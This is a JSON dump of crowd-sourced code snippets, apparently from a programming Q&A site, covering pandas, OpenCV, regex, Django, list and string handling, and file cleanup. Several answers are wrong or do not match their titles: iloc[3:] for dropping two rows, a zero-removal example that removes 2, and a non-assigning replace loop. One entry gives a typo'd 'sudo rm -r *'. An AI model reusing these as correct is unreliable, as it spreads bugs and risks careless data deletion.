    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4092,
    "keyword": null,
    "link": null,
    "title": " read txt in pandas",
    "description": "df = pd.read_csv('output_list.txt', sep=\" \", header=None, names=[\"a\", \"b\", \"c\"])\ndata = pd.read_csv('output_list.txt', sep=\" \", header=None) data.columns = [\"a\", \"b\", \"c\", \"etc.\"]\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4093,
    "keyword": null,
    "link": null,
    "title": " read video with opencv",
    "description": "import numpy as np import cv2 cap = cv2.VideoCapture('videos/wa.avi') while(cap.isOpened()):   ret, frame = cap.read()   gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)   cv2.imshow('frame',gray)   if cv2.waitKey(1) & 0xFF == ord('q'):     break  cap.release() cv2.destroyAllWindows()\nimport cv2 frameWidth = 640 frameHeight = 480 cap = cv2.VideoCapture(\"Resources/test_ video.mp4\") while True:     success, img = cap.read()     img = cv2.resize(img, (frameWidth, frameHeight))     cv2.imshow(\"Result\", img)     if cv2.waitKey(1) and 0xFF == ord('q'):          break \n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4094,
    "keyword": null,
    "link": null,
    "title": " record the amount of time ittales for code to run python",
    "description": "from time import time  start = time() #code here print(f'Time taken to run: {time() - start} seconds'\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4095,
    "keyword": null,
    "link": null,
    "title": " record webcam in python",
    "description": "import numpy as np import cv2  cap = cv2.VideoCapture(0)  while(True):     # Capture frame-by-frame     ret, frame = cap.read()          # Display the resulting frame     cv2.imshow('frame',frame)          # Delay 1 milisecond everytime and check if pressed \"q\" to quit     if cv2.waitKey(1) & 0xFF == ord('q'):         break  # When everything done, release the capture cap.release() cv2.destroyAllWindows() \n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4096,
    "keyword": null,
    "link": null,
    "title": " rectangle in tkinter",
    "description": "from tkinter import *  root = Tk()  c = Canvas(root) c.pack() c.create_rectangle(100, 100, 200, 200)  root.mainloop()\n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4097,
    "keyword": null,
    "link": null,
    "title": " recursion",
    "description": "print(\"Hello World\")\n# modified code tranclated to python from (Drab Duck)  def fact(num):   if num <= 1:       return 1   else:     return num*fact(num-1)    \n/*Java*/ static void recursion(){ recursion(0); } static void recursion(int x){ \tSystem.out.println(\"eheh \" + x);     if(x != 666) recursion(x+1); }\n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4098,
    "keyword": null,
    "link": null,
    "title": " redirect django",
    "description": "LOGIN_REDIRECT_URL = 'home'\nfrom django.shortcuts import redirect  def my_view(request):     # ...     return redirect('some-view-name', foo='bar') \n<form method=\"POST\">     {% csrf_token %}     {{ form }}     <input type=\"hidden\" name=\"next\" value=\"{{ request.path }}\">     <button type=\"submit\">Let's Go</button> </form> \nfrom django.shortcuts import redirect\nfrom django.shortcuts import render  def my_view(request):     # View code here...     return render(request, 'myapp/index.html', {         'foo': 'bar',     }, content_type='application/xhtml+xml') \nfrom django.http import Http404  def my_view(request):     my_objects = list(MyModel.objects.filter(published=True))     if not my_objects:         raise Http404(\"No MyModel matches the given query.\") \n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4099,
    "keyword": null,
    "link": null,
    "title": " reduced fraction python",
    "description": ">>> from fractions import Fraction >>> Fraction(98, 42) Fraction(7, 3)\n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4100,
    "keyword": null,
    "link": null,
    "title": " regex to find ip address python",
    "description": "r'(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})'\n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4101,
    "keyword": null,
    "link": null,
    "title": " regular expression to find numbers in a string python",
    "description": "import re  # Example with integers and floats both positive and negative and scientific notation. target_str = 'I live at 9-162 Malibeu. My phone number is +351911199911. I have 5.50 dollars with me, but I have a net income of -1.01 per day which is about -1 dollar a day with an error of +-.01. Also the earth has a mass of 5.972e24 kg or about 6e24 kg.' # Depending on what you want (p=positive, n=negative): regex_expressions = {     'p_ints' :            \"\\d+\",     'pn_ints' :           \"[-+]?\\d+\",     'p_floats' :          \"\\d*\\.\\d+\",     'pn_floats' :         \"[-+]?\\d*\\.\\d+\",     'scientific_notation':\"[-+]?\\d+(?:\\.\\d+)?e[-+]?\\d+\",     'pn_floats_or_ints' : \"(?:[-+]?)(?:\\d*\\.\\d+|\\d+)\",     'universal':          \"(?:[-+]?)(?:\\d+(?:\\.\\d+)?e[-+]?\\d+|\\d*\\.\\d+|\\d+)\" }  regex_results = dict()  for target_type, regex_expression in zip (regex_expressions.keys(), regex_expressions.values()):     regex_results[target_type] = re.findall(regex_expression, target_str)     print(target_type,':',regex_results[target_type])  print ('\\nThese results are still strings, but can easily be turned into floats or ints:') for number in regex_results['universal']:     print(float(number))  \"\"\" Used RegEx symbols:     [] : look for any character inside the brackets     \\d : look for any digit     \\. : look for a dot (.)     + : look for one or more occurences of the previous expression     * : look for zero or more occurences of the previous expression     ? : look for zero or one occurences of the previous expression     (?:...) : create a non-capturing group     | : look for either of the previous expressions (OR operator)       Short explanation of each regex:     -> positive integers: \\d+         look for one or more digits     -> positive or negative integers: [-+]?\\d+         look for one or more digits, potentially preceded by a '-' or a '+'     -> positive floats: \\d*\\.\\d+         look for zero or more digits, followed by a dot, followed by one or more digits (a lazy representation such as '.3' works in this case). Scientific notation is not allowed.     -> positive or negative floats: [-+]?\\d*\\.\\d+]         look for zero or more digits, followed by a dot, followed by one or more digits, potentially preceded by a '-' or a '+'     -> scientific notation: [-+]?\\d+(?:\\.\\d+)?e[-+]?\\d+         look for any '+' or '-' signs, if they exist. Look for one or more digits, potentially followed by a dot and decimal part. Look for an 'e', followed by one or more digits     -> any number not in scientific notation: (?:[-+]?)(?:\\d*\\.\\d+|\\d+)         look for any '+' or '-' signs, if they exist. Look for zero or more digits, followed by a dot, followed by one or more digits (float) OR look for one or more digits (integer).     -> any number: (?:[-+]?)(?:\\d*\\.\\d+|\\d+|\\d?e[-+]?\\d?)         basically look for '+' or '-' and then do an OR between the previous expressions using non capturing groups. \"\"\"  \"\"\" OUTPUT:     p_ints : ['9', '162', '351911199911', '5', '50', '1', '01', '1', '01', '5', '972', '24', '6', '24']     pn_ints : ['9', '-162', '+351911199911', '5', '50', '-1', '01', '-1', '01', '5', '972', '24', '6', '24']     p_floats : ['5.50', '1.01', '.01', '5.972']     pn_floats : ['5.50', '-1.01', '-.01', '5.972']     scientific_notation : ['5.972e24', '6e24']     pn_floats_or_ints : ['9', '-162', '+351911199911', '5.50', '-1.01', '-1', '-.01', '5.972', '24', '6', '24']     universal : ['9', '-162', '+351911199911', '5.50', '-1.01', '-1', '-.01', '5.972e24', '6e24']          These results are still strings, but can easily be turned into floats or ints:     9.0     -162.0     351911199911.0     5.5     -1.01     -1.0     -0.01     5.972e+24     6e+24 \"\"\"\n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4102,
    "keyword": null,
    "link": null,
    "title": " reject invalid input using a loop in python",
    "description": "take input while incorrect input:     take input      #Eg. Taking the month input for the first quarter of the year. months = ['january', 'february', 'march'] month = input('Select the month').lower() while month not in months:   month = input('Oops! Incorrect input. Select month again').lower()       \n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4103,
    "keyword": null,
    "link": null,
    "title": " reload all extensions discord.py",
    "description": "# Make sure you don't have a command called \"commands\" @client.command() @commands.is_owner() # Makes sure the person running the command is the owner async def restart(): \tfor filename in os.listdir(\"./cogs\"): # Change \"cogs\" to your folder name \t\tif filename.endswith(\".py\"): \t\t\tclient.reload_extension(f\"cogs.{filename[:-3]}\") # Change \"cogs\" to your folder name\n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4104,
    "keyword": null,
    "link": null,
    "title": " remainder identifying python",
    "description": "n = 23 #(whatever number you want) if n%1 == 0:     print(\"True. n is an integer\") else:     print(\"False. n is not an integer\")\n",
    "reg_date": "2021-10-12T11:34:34.000Z"
  },
  {
    "id": 4105,
    "keyword": null,
    "link": null,
    "title": " remocve pyc files",
    "description": "find . -name \"*.pyc\" -exec rm -f {} \\;\n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4106,
    "keyword": null,
    "link": null,
    "title": " remove ï»¿ python",
    "description": "data = open('info.txt', encoding='utf-8-sig')\n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4107,
    "keyword": null,
    "link": null,
    "title": " remove a char in a string python",
    "description": "s = 'abc12321cba'  print(s.replace('a', ''))  =>s out:bc12321cb\nfor char in line:     if char in \" ?.!/;:\":         line.replace(char,'')\na_string = a_string.replace(\"d\", \"\")\n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4108,
    "keyword": null,
    "link": null,
    "title": " remove all 0 from list python",
    "description": ">>> x = [1,2,3,2,2,2,3,4] >>> list(filter(lambda a: a != 2, x)) [1, 3, 3, 4]\nX = [i for i in X if i != 0]\n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4109,
    "keyword": null,
    "link": null,
    "title": " remove all files in a directory mac",
    "description": "ksudo rm -r * //terminal command on mac \n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4110,
    "keyword": null,
    "link": null,
    "title": " remove all occurrences of a character in a list python",
    "description": ">>> x = [1,2,3,2,2,2,3,4] >>> list(filter(lambda a: a != 2, x)) [1, 3, 3, 4]\n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4111,
    "keyword": null,
    "link": null,
    "title": " remove all pyc",
    "description": "find . -name \"*.pyc\" -exec rm -f {} \\; \n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4112,
    "keyword": null,
    "link": null,
    "title": " remove all pyc files",
    "description": "find . -name \"*.pyc\" -exec rm -f {} \\; \n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4113,
    "keyword": null,
    "link": null,
    "title": " remove all pycache files",
    "description": "find . | grep -E \"(__pycache__|\\.pyc|\\.pyo$)\" | xargs rm -rf\n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4114,
    "keyword": null,
    "link": null,
    "title": " remove column from dataframe",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n#To delete the column without having to reassign df df.drop('column_name', axis=1, inplace=True) \n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\n# Best method so far. df = df.loc[:, ~df.columns.str.contains('^Unnamed')]\ndf.drop('column_name', axis=1, inplace=True)\n>>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \n",
    "reg_date": "2021-10-12T11:34:35.000Z"
  },
  {
    "id": 4115,
    "keyword": null,
    "link": null,
    "title": " remove comma from string python column",
    "description": "df['x']=df['x'].str.replace(',','') \n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4116,
    "keyword": null,
    "link": null,
    "title": " remove commas from string python",
    "description": "s = s.replace(',', '')\n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4117,
    "keyword": null,
    "link": null,
    "title": " remove duplicates from list python",
    "description": "mylist = [\"a\", \"b\", \"b\", \"c\", \"a\"] mylist = sorted(set(mylist)) print(mylist)\n   mylist = [\"a\", \"b\", \"a\", \"c\", \"c\"] mylist = list(dict.fromkeys(mylist))    print(mylist) \n# HOW TO REMOVE DUPLICATES FROM A LIST: # 1) CREATE A LIST my_list = [1, 2, 3, 4, 5, 5, 5, 1] # 2) CONVERT IT TO A SET AND THEN BACK INTO A LIST my_list = list(set(my_list)) # 3) DONE!  print(my_list) #WILL PRINT: [1, 2, 3, 4, 5]\n# remove duplicate from given_list using list comprehension res = [] [res.append(x) for x in given_list if x not in res]\nmylist = [\"a\", \"b\", \"a\", \"c\", \"c\"] mylist = list(dict.fromkeys(mylist))\n>>> list(dict.fromkeys('abracadabra')) ['a', 'b', 'r', 'c', 'd'] \n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4118,
    "keyword": null,
    "link": null,
    "title": " remove empty strings from list python",
    "description": "def compact(lst):     return list(filter(None, lst))  compact([0, 1, False, 2, '', 3, 'a', 's', 34])     # [ 1, 2, 3, 'a', 's', 34 ]\nwithout_empty_strings = [string for string in a_list if string != \"\"]\nlist2 = filter(None, list1)\n[name for name in starring if name.strip()]\n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4119,
    "keyword": null,
    "link": null,
    "title": " remove extension from filename python",
    "description": " import os >>> base=os.path.basename('/root/dir/sub/file.ext') >>> base 'file.ext' >>> os.path.splitext(base) ('file', '.ext') >>> os.path.splitext(base)[0] 'file'\nimport os base=os.path.basename('/root/dir/sub/file.ext') print(base) #'file.ext' print(os.path.splitext(base)) #('file', '.ext') print(os.path.splitext(base)[0]) #'file'\nimport os  dir_name = \"/Users/ben/downloads/\" test = os.listdir(dir_name)  for item in test:     if item.endswith(\".zip\"):         os.remove(os.path.join(dir_name, item)) \nimport os print os.path.splitext(\"sample.txt\")[0]\nfrom pathlib import Path  Path('/root/dir/sub/file.ext').stem \n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4120,
    "keyword": null,
    "link": null,
    "title": " remove first 2 rows in pandas",
    "description": "df = df.iloc[3:] \n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4121,
    "keyword": null,
    "link": null,
    "title": " remove idx of list python",
    "description": "a = [-1, 1, 66.25, 333, 333, 1234.5] del a[0] a [1, 66.25, 333, 333, 1234.5] del a[2:4] a [1, 66.25, 1234.5] del a[:] a []\n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4122,
    "keyword": null,
    "link": null,
    "title": " remove keys from array python",
    "description": "a_dict = {\"color\": \"blue\", \"fruit\": \"apple\", \"pet\": \"dog\"}  [value for key, value in a_dict.items()] >>> ['blue', 'apple', 'dog']\ndictionary.pop(key)\n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4123,
    "keyword": null,
    "link": null,
    "title": " remove minimize and maximize and cancle button python pyqt5",
    "description": "self.setWindowFlag(QtCore.Qt.WindowCloseButtonHint, False) \n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4124,
    "keyword": null,
    "link": null,
    "title": " remove multiple space python",
    "description": "import re re.sub(' +', ' ', 'The     quick brown    fox') 'The quick brown fox'\n",
    "reg_date": "2021-10-12T11:34:36.000Z"
  },
  {
    "id": 4125,
    "keyword": null,
    "link": null,
    "title": " remove n from string python",
    "description": "line = line.strip('\\n') line = line.strip('\\t')\na_string = a_string.rstrip(\"\\n\")\nmylist = [] # Assuming that you have loaded data into a lines variable.  for line in lines:     mylist.append(line.strip().split('\\t')\n# Remove all line breaks from a long string of text  mystr = 'hello world, how do i enter line breaks?' >>> mystr.replace(' ', '') 'helloworld,howdoienterlinebreaks?'  # You can also replace more then one thing for example: mystring = mystring.replace('\\n', ' ').replace('\\r', '') \nexample_string = \"Hello there\"  def remove_chars(n, string):     list_of_chars_in_string = [char for char in string]           for num in range(n):         list_of_chars_in_string.pop() # Removes last n characters in string          new_string = ''.join(list_of_chars_in_string)     return new_string\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4126,
    "keyword": null,
    "link": null,
    "title": " remove n string",
    "description": "a_string = a_string.rstrip(\"\\n\")\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4127,
    "keyword": null,
    "link": null,
    "title": " remove nan from list python",
    "description": "cleanedList = [x for x in countries if str(x) != 'nan'] \nx = x[~numpy.isnan(x)]\ndf = df[df['my_var'].notna()]\ndf.dropna(subset = [\"column2\"], inplace=True)\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4128,
    "keyword": null,
    "link": null,
    "title": " remove negative numbers from list python",
    "description": "my_positive_list = [number for number in my_list if number >= 0]\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4129,
    "keyword": null,
    "link": null,
    "title": " remove non-alphabetic pandas python",
    "description": "import pandas as pd  ded = pd.DataFrame({'strings': ['a#bc1!', 'a(b$c']})  ded.strings.str.replace('[^a-zA-Z0-9]', '')\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4130,
    "keyword": null,
    "link": null,
    "title": " remove object from array python",
    "description": "my_list = [1,2,4,6,7]  del my_list[1] # Removes index 1 from the list print my_list # [1,4,6,7] my_list.remove(4) # Removes the integer 4 from the list, not the index 4 print my_list # [1,6,7] my_list.pop(2) # Removes index 2 from the list\narray = [\"red\", \"green\", \"blue\"] del array[0] # this deletes the first element, red, in the array\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4131,
    "keyword": null,
    "link": null,
    "title": " remove punctuation from string python",
    "description": "#with re import re s = \"string. With. Punctuation?\" s = re.sub(r'[^\\w\\s]','',s) #without re s = \"string. With. Punctuation?\" s.translate(str.maketrans('', '', string.punctuation))\nimport string #make translator object translator=str.maketrans('','',string.punctuation) string_name=string_name.translate(translator)\ns.translate(str.maketrans('', '', string.punctuation))\n# define punctuation punctuations = '''!()-[]{};:'\"\\,<>./?@#$%^&*_~'''  my_str = \"Hello!!!, he said ---and went.\"  # To take input from the user # my_str = input(\"Enter a string: \")  # remove punctuation from the string no_punct = \"\" for char in my_str:    if char not in punctuations:        no_punct = no_punct + char  # display the unpunctuated string print(no_punct) \nimport string  sentence = \"Hey guys !, How are 'you' ?\" no_punc_txt = \"\" for char in sentence:    if char not in string.punctuation:        no_punc_txt = no_punc_txt + char print(no_punc_txt);                 # Hey guys  How are you  # or: no_punc_txt = sentence.translate(sentence.maketrans('', '', string.punctuation)) print(no_punc_txt);                 # Hey guys  How are you \n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4132,
    "keyword": null,
    "link": null,
    "title": " remove r and n from string python",
    "description": "stocks = [x.replace(\"\\r\\n\",\"\") for x in stocks] \n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4133,
    "keyword": null,
    "link": null,
    "title": " remove rows or columns with NaN value",
    "description": "df.dropna()     #drop all rows that have any NaN values df.dropna(how='all')\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4134,
    "keyword": null,
    "link": null,
    "title": " remove single and double quotes from string python",
    "description": "a_string = '\"ab\"cd\"' stripped_string = a_string.strip('\"') # Only removes quote marks at each end \t\t\t\t\t\t\t\t\t  # of the string. print(stripped_string)  #Output: ab\"cd  replaced_string = a_string.replace('\"',\"\") #Removes al quote marks from  \t\t\t\t\t\t\t\t\t\t   # string. print(replaced_string) #Output: abcd\n",
    "reg_date": "2021-10-12T11:34:37.000Z"
  },
  {
    "id": 4135,
    "keyword": null,
    "link": null,
    "title": " remove substring python",
    "description": ">>> papa = 'papa is a good man' >>> papa.replace('papa', '') ' is a good man'\ns = 'ab12abc34ba' print(s.replace('ab', ''))\n\"Str*ing With Chars I! don't want\".replace('!','').replace('*','')\ntxt = 'abbacabbd' print(url.replace('bbd',''))  #output: abbaca\nimport re url = 'abcdc.com' url = re.sub('\\.com$', '', url)\n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4136,
    "keyword": null,
    "link": null,
    "title": " remove trailing and leading spaces in python",
    "description": "text = \"   Hello World        \" text.strip() # Hello World\nstring=' t e s t '  print(string.replace(' ','')) \n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4137,
    "keyword": null,
    "link": null,
    "title": " remove unicode from string python",
    "description": ".encode(\"ascii\", \"ignore\")\nreturn ''.join([i if ord(i) < 128 else ' ' for i in text])\n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4138,
    "keyword": null,
    "link": null,
    "title": " remove web linnks from string python",
    "description": "re.sub(r'http\\S+', '', stringliteral)\nimport re text = re.sub('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))'+, '', text, flags=re.MULTILINE)\n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4139,
    "keyword": null,
    "link": null,
    "title": " remove word from string python",
    "description": "#You can remove a word from a string using str.replace () myString = 'papa is a good man' newString = myString.replace('papa', '') >>>' is a good man'\n#you can use replace function to remove specific word. message = 'you can use replace function' message = message.replace('function', '') print(message)\n#you can use replace function to remove specific word. >>> message = 'you can use replace function' >>> message.replace('function', '') >>>'you can use replace '\n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4140,
    "keyword": null,
    "link": null,
    "title": " remove x label matplotlib",
    "description": "plt.gca().axes.get_xaxis().set_visible(False) plt.gca().axes.get_yaxis().set_visible(False)\nplt.xticks(x, \" \")\n# Basic syntax: ax.set_yticklabels([]) ax.set_xticklabels([])  # Example usage: import matplotlib.pyplot as plt  # Create Figure and Axes instances fig,ax = plt.subplots(1)  # Make your plot, set your axes labels ax.plot(range(1, 10),range(10, 1, -1)) ax.set_ylabel('Y Label') ax.set_xlabel('X Label')  # Turn off tick labels &mdash; tick marks remain but values are removed ax.set_yticklabels([]) ax.set_xticklabels([])  plt.show()\n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4141,
    "keyword": null,
    "link": null,
    "title": " rename column name pandas dataframe",
    "description": "df.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf.rename(columns={\"A\": \"a\", \"B\": \"b\", \"C\": \"c\"}, errors=\"raise\", inplace=True) \ndf.columns = ['A','B']\n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4142,
    "keyword": null,
    "link": null,
    "title": " rename column pandas",
    "description": ">>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \ndf_new = df.rename(columns={'A': 'a'}, index={'ONE': 'one'}) print(df_new) #         a   B   C # one    11  12  13 # TWO    21  22  23 # THREE  31  32  33  print(df) #         A   B   C # ONE    11  12  13 # TWO    21  22  23 # THREE  31  32  33 \n>>> df.rename(index={0: \"x\", 1: \"y\", 2: \"z\"})    A  B x  1  4 y  2  5 z  3  6 \n>>> df.rename({1: 2, 2: 4}, axis='index')    A  B 0  1  4 2  2  5 4  3  6 \n>>> df.rename(columns={\"A\": \"a\", \"B\": \"b\", \"C\": \"c\"}, errors=\"raise\") Traceback (most recent call last): KeyError: ['C'] not found in axis \n>>> df.rename(str.lower, axis='columns')    a  b 0  1  4 1  2  5 2  3  6 \n>>> df.index RangeIndex(start=0, stop=3, step=1) >>> df.rename(index=str).index Index(['0', '1', '2'], dtype='object') \n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4143,
    "keyword": null,
    "link": null,
    "title": " rename columns in python",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\nimport pandas as pd data = pd.read_csv(file) data.rename(columns={'original':'new_name'}, inplace=True)\n# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\ndf = df.rename(columns = {'myvar':'myvar_new'})\n>>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4144,
    "keyword": null,
    "link": null,
    "title": " rename columns pandas",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\nimport pandas as pd data = pd.read_csv(file) data.rename(columns={'original':'new_name'}, inplace=True)\n# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\ndf = df.rename(columns = {'myvar':'myvar_new'})\n",
    "reg_date": "2021-10-12T11:34:38.000Z"
  },
  {
    "id": 4145,
    "keyword": null,
    "link": null,
    "title": " rename coordinate netcdf python xarray",
    "description": "da.rename({'x': 'longitude','y': 'latitude'}) \n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4146,
    "keyword": null,
    "link": null,
    "title": " rename df column",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\nimport pandas as pd data = pd.read_csv(file) data.rename(columns={'original':'new_name'}, inplace=True)\n# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\n>>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \ndf.rename({'a': 'X', 'b': 'Y'}, axis=1, inplace=True) df     X  Y  c  d  e 0  x  x  x  x  x 1  x  x  x  x  x 2  x  x  x  x  x   \nprint(df.rename(columns={'A': 'a', 'C': 'c'})) #         a   B   c # ONE    11  12  13 # TWO    21  22  23 # THREE  31  32  33 \n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4147,
    "keyword": null,
    "link": null,
    "title": " rename file python",
    "description": "import os   os.rename('guru99.txt','career.guru99.txt') \nimport os   os.rename('old_name.txt','new_name.txt') \nimport os os.rename(r'C:\\Users\\Ron\\Desktop\\Test\\Products.txt',r'C:\\Users\\Ron\\Desktop\\Test\\Shipped Products.txt') \nimport os  old_file_name = \"/home/career_karma/raw_data.csv\" new_file_name = \"/home/career_karma/old_data.csv\"  os.rename(old_file_name, new_file_name)  print(\"File renamed!\")\n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4148,
    "keyword": null,
    "link": null,
    "title": " rename multiple pandas columns with list",
    "description": "for j in range(len(df.columns)):     old = df.columns[j]     new = new_columns[j]     df = df.rename(columns = {old:new})\n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4149,
    "keyword": null,
    "link": null,
    "title": " renaming headers pandasd",
    "description": "df = df.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}) \ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\n>gapminder.rename(columns={'pop':'population',                           'lifeExp':'life_exp',                           'gdpPercap':'gdp_per_cap'},                   inplace=True)   >print(gapminder.columns)   Index([u'country', u'year', u'population', u'continent', u'life_exp',        u'gdp_per_cap'],       dtype='object')   >gapminder.head(3)          country  year  population continent  life_exp  gdp_per_cap 0  Afghanistan  1952     8425333      Asia    28.801   779.445314 1  Afghanistan  1957     9240934      Asia    30.332   820.853030 2  Afghanistan  1962    10267083      Asia    31.997   853.100710 \n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4150,
    "keyword": null,
    "link": null,
    "title": " render template not showing images",
    "description": "cd path/to/your/flask/app mkdir static mv /Users/username/Desktop/datafolder/pics/pic1.png /static \n",
    "reg_date": "2021-10-12T11:34:39.000Z"
  },
  {
    "id": 4151,
    "keyword": null,
    "link": null,
    "title": " repeat 10 times python",
